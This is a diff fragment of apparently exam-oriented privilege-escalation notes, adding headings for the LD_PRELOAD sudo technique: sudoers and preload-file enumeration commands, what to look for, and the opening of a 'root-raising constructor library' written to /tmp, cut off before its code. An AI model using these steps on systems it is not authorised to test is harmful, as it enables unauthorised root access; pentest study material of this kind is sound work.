@@ -4,6 +4,8 @@
 
 **Optional.** Safe to skip under exam time pressure.
 
+LD_PRELOAD in sudo, preload writable:
+
 ```bash
 sudo -n -l 2>/dev/null
 grep -R 'LD_PRELOAD' /etc/sudoers /etc/sudoers.d 2>/dev/null
@@ -13,6 +15,8 @@ ls -l /etc/ld.so.preload 2>/dev/null
 **Look for:** `env_keep += "LD_PRELOAD"` with any allowed command, or a writable global preload file.
 
 **If found:** compile a constructor library and run the allowed command with it:
+
+Root-raising constructor library:
 
 ```bash
 cat > /tmp/owb.c <<'EOF'
